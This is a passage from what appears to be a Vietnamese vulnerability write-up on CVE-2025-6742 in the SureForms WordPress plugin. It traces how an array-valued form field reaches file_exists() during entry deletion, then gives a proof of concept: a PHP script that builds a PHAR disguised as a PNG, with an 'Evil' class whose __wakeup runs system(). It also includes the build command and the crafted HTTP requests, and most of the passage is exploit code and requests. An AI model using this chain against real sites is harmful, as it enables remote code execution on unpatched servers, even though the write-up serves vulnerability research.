</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">delete_entry_files</span><span class="p">(</span> <span class="nv">$entry_id</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$entry_id</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the entry data to get the file URLs.
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$form_data</span> <span class="o">=</span> <span class="nx">Entries</span><span class="o">::</span><span class="na">get_form_data</span><span class="p">(</span> <span class="nv">$entry_id</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$form_data</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$form_data</span> <span class="k">as</span> <span class="nv">$field_name</span> <span class="o">=&gt;</span> <span class="nv">$value</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Continue to the next iteration if the field name does not contain &#39;srfm-upload&#39; and value is not an array.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="k">false</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$field_name</span><span class="p">,</span> <span class="s1">&#39;srfm-upload&#39;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$value</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$value</span> <span class="k">as</span> <span class="nv">$file_url</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// If the file URL is empty, skip to the next iteration.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$file_url</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_path</span> <span class="o">=</span> <span class="nx">Helper</span><span class="o">::</span><span class="na">convert_fileurl_to_filepath</span><span class="p">(</span> <span class="nx">urldecode</span><span class="p">(</span> <span class="nv">$file_url</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Delete the file if it exists.
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$file_path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span> <span class="nv">$file_path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Sau khi xem qua logic của hàm <code>delete_entry_files()</code>, tôi nhận thấy các từ khóa như <code>entries</code> xuất hiện khá nhiều. Có sự trùng hợp ở đây:</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/entry.png" title="Entry trong UI" data-thumbnail="/posts/2025-11-19-cve-2025-6742/entry.png" data-sub-html="<h2>Entry</h2><p>Entry trong UI</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/entry.png' alt="Entry" height="636" width="1342"></a><figcaption class="image-caption">Entry trong UI</figcaption>
  </figure></p>
<p>Có vẻ đúng, nhưng như bạn thấy thông báo <code>&quot;No records found&quot;</code>, chưa có dữ liệu nào để hiển thị. Vậy ta thêm như nào?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$form_data</span> <span class="o">=</span> <span class="nx">Entries</span><span class="o">::</span><span class="na">get_form_data</span><span class="p">(</span> <span class="nv">$entry_id</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nhìn vào tên hàm được gọi: <code>get_form_data</code> thì khả năng cao dữ liệu được lấy từ form do client submit vì lỗ hổng này được công bố là <strong>Unauthenticated</strong></p>
<p>Thử tạo form bằng chức năng của plugin:</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/create_form.png" title="Tạo form" data-thumbnail="/posts/2025-11-19-cve-2025-6742/create_form.png" data-sub-html="<h2>Create Form</h2><p>Tạo form</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/create_form.png' alt="Create Form" height="998" width="1343"></a><figcaption class="image-caption">Tạo form</figcaption>
  </figure></p>
<p>Tạo post và embed shortcode của form vừa tạo:</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/embed.png" title="Embed Shortcode" data-thumbnail="/posts/2025-11-19-cve-2025-6742/embed.png" data-sub-html="<h2>Embed</h2><p>Embed Shortcode</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/embed.png' alt="Embed" height="507" width="1346"></a><figcaption class="image-caption">Embed Shortcode</figcaption>
  </figure></p>
<p>Truy cập form được tạo và submit dữ liệu bất kỳ:</p>
<div class="highlight" title="Request"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="hl"><span class="lnt">37
</span></span><span class="lnt">38
</span><span class="hl"><span class="lnt">39
</span></span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/sureforms/v1/submit-form?_locale=user</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">application/json, */*;q=0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.7,vi;q=0.3</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://localhost/2025/11/19/form-testing/</span>
</span></span><span class="line"><span class="cl"><span class="n">X-WP-Nonce</span><span class="o">:</span> <span class="l">2c506366a5</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">730</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">wp-settings-time-3=1763365761</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;sureforms_form_submit&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">d3b9273370
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;_wp_http_referer&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/2025/11/19/form-testing/
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;form-id&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;srfm-sender-email-field&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line hl"><span class="cl">Content-Disposition: form-data; name=&#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">testing
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/submit.png" title="Submit form từ Unauthenticated user" data-thumbnail="/posts/2025-11-19-cve-2025-6742/submit.png" data-sub-html="<h2>Capture request</h2><p>Submit form từ Unauthenticated user</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/submit.png' alt="Capture request" height="861" width="1496"></a><figcaption class="image-caption">Submit form từ Unauthenticated user</figcaption>
  </figure></p>
<p>Response trả về một số trường như: <strong>trạng thái</strong> và <strong>id</strong> của submit.</p>
<p>Tên <code>delete_entry_files</code> đề cập đến việc xóa một entry, ta thử đặt breakpoint đầu hàm và thử xóa 1 entry.</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/entry_del.gif" title="Debugger hoạt động khi xóa entry" data-thumbnail="/posts/2025-11-19-cve-2025-6742/entry_del.gif" data-sub-html="<h2>Entry Delete</h2><p>Debugger hoạt động khi xóa entry</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/entry_del.gif' alt="Entry Delete" height="1082" width="1920"></a><figcaption class="image-caption">Debugger hoạt động khi xóa entry</figcaption>
  </figure></p>
<p>Tiếp tục debug</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/value.png" title="Gái trị của $value" data-thumbnail="/posts/2025-11-19-cve-2025-6742/value.png" data-sub-html="<h2>Value</h2><p>Gái trị của $value</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/value.png' alt="Value" height="747" width="1919"></a><figcaption class="image-caption">Gái trị của $value</figcaption>
  </figure></p>
<p>Ta thấy <code>$value</code> là giá trị do ta kiểm soát. <code>$value</code> cần phải là một mảng để nó không bị bỏ qua <code>continue</code> và để <code>file_exists()</code> có thể được gọi.</p>
<p>Để <code>$value</code> là một mảng, ta submit với name chứa <code>[]</code> ở cuối:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">testing</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/value1.png" title="Gái trị của $value" data-thumbnail="/posts/2025-11-19-cve-2025-6742/value1.png" data-sub-html="<h2>Value</h2><p>Gái trị của $value</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/value1.png' alt="Value" height="891" width="1919"></a><figcaption class="image-caption">Gái trị của $value</figcaption>
  </figure></p>
<h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Khi đã debug được rồi thì ta sẽ thấy luồng dẫn tới sink:</p>
<div class="diagram-container">
  <pre class="mermaid">
graph TD
A["Client submit form"] 
    --> B["Admin delete entry"]
B --> C["WordPress hook: admin_init"]
C --> D["handle_entry_actions"]
D --> E["Entries_List_Table::handle_entry_status()"]
E -- $action=delete --> F["Entries_List_Table::delete_entry_files()"]
F --> G{"$value is array"}
G -- Yes --> H["call file_exists( $file_path )"] --> L["RCE: PHAR Deserialization"]
G -- No --> K["continue"]
</pre>
  <pre class="mermaid-dark">
graph TD
A["Client submit form"] 
    --> B["Admin delete entry"]
B --> C["WordPress hook: admin_init"]
C --> D["handle_entry_actions"]
D --> E["Entries_List_Table::handle_entry_status()"]
E -- $action=delete --> F["Entries_List_Table::delete_entry_files()"]
F --> G{"$value is array"}
G -- Yes --> H["call file_exists( $file_path )"] --> L["RCE: PHAR Deserialization"]
G -- No --> K["continue"]
</pre>
  <pre class="mermaid-neutral">
graph TD
A["Client submit form"] 
    --> B["Admin delete entry"]
B --> C["WordPress hook: admin_init"]
C --> D["handle_entry_actions"]
D --> E["Entries_List_Table::handle_entry_status()"]
E -- $action=delete --> F["Entries_List_Table::delete_entry_files()"]
F --> G{"$value is array"}
G -- Yes --> H["call file_exists( $file_path )"] --> L["RCE: PHAR Deserialization"]
G -- No --> K["continue"]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD
A["Client submit form"] 
    --> B["Admin delete entry"]
B --> C["WordPress hook: admin_init"]
C --> D["handle_entry_actions"]
D --> E["Entries_List_Table::handle_entry_status()"]
E -- $action=delete --> F["Entries_List_Table::delete_entry_files()"]
F --> G{"$value is array"}
G -- Yes --> H["call file_exists( $file_path )"] --> L["RCE: PHAR Deserialization"]
G -- No --> K["continue"]
</pre></template>
</div>
<h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Sử dụng admin account để tạo form và thêm vào post</li>
<li>Tạo 1 PHP file <code>create_phar.php</code> với code sau:</li>
</ol>
<div class="highlight" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Định nghĩa class Evil với thuộc tính và hàm __wakeup
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">Evil</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Thuộc tính command chứa lệnh hệ thống sẽ thực thi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$command</span> <span class="o">=</span> <span class="s2">&#34;ls /&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Hàm __wakeup() được gọi khi object này bị unserialize
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span><span class="o">:</span> <span class="nx">void</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Khi unserialize, sẽ thực thi lệnh trong $command và dừng chương trình
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">die</span><span class="p">(</span><span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Tạo một file PHAR mới tên poc.phar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;poc.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Bắt đầu ghi dữ liệu vào PHAR (buffering)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Thêm một entry giả tên test.png với nội dung &#34;text&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.png&#39;</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Đặt stub cho PHAR: bắt đầu bằng magic bytes của PNG để giả dạng file ảnh,
</span></span></span><span class="line"><span class="cl"><span class="c1">// sau đó có đoạn PHP __HALT_COMPILER() để đánh dấu kết thúc stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x89</span><span class="s2">PNG</span><span class="se">\r\n\x1a\n</span><span class="s2">&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Ghi metadata vào PHAR: ở đây là một object Evil đã khởi tạo
</span></span></span><span class="line"><span class="cl"><span class="c1">// Metadata sẽ được serialize, và nếu bị unserialize sẽ kích hoạt __wakeup()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="k">new</span> <span class="nx">Evil</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Kết thúc ghi, flush dữ liệu ra file poc.phar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span></span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>Tạo PHAR file <code>poc.phar</code> bằng cách chạy  <code>php --define phar.readonly=0 create_phar.php</code>.</li>
</ol>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Thông tin</div>
  <div class="details-content">
    <div class="admonition-content"><p><code>phar.readonly</code> là một directive trong PHP (cấu hình của extension Phar). Mặc định giá trị của nó là 1 (readonly) không thể tạo file. Khi muốn tạo file PHAR, cần tắt chế độ readonly bằng cách thêm option <code>phar.readonly=0</code> hoặc cấu hình trong <code>php.ini</code></p></div>
  </div>
</div><ol start="4">
<li>Đổi tên <code>poc.phar</code> thành <code>poc.png</code> vì thông thường các trường hợp sẽ chấp nhận upload file ảnh thay vì <code>.phar</code></li>
<li>Upload <code>poc.jpg</code> bằng Trình chỉnh sửa phương tiện. Lưu ý đường dẫn của nó trong <code>wp-content/uploads</code>.</li>
<li>Gửi lại request submit form:</li>
</ol>
<div class="highlight" title="Request"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="hl"><span class="lnt">37
</span></span><span class="lnt">38
</span><span class="hl"><span class="lnt">39
</span></span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/sureforms/v1/submit-form?_locale=user</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">application/json, */*;q=0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.7,vi;q=0.3</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://localhost/2025/11/19/form-testing/</span>
</span></span><span class="line"><span class="cl"><span class="n">X-WP-Nonce</span><span class="o">:</span> <span class="l">2c506366a5</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">775</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">wp-settings-time-3=1763365761</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;sureforms_form_submit&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">d3b9273370
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;_wp_http_referer&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/2025/11/19/form-testing/
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;form-id&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;srfm-sender-email-field&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------geckoformboundary951e0587d59c442ebcc7cae9dcac2221
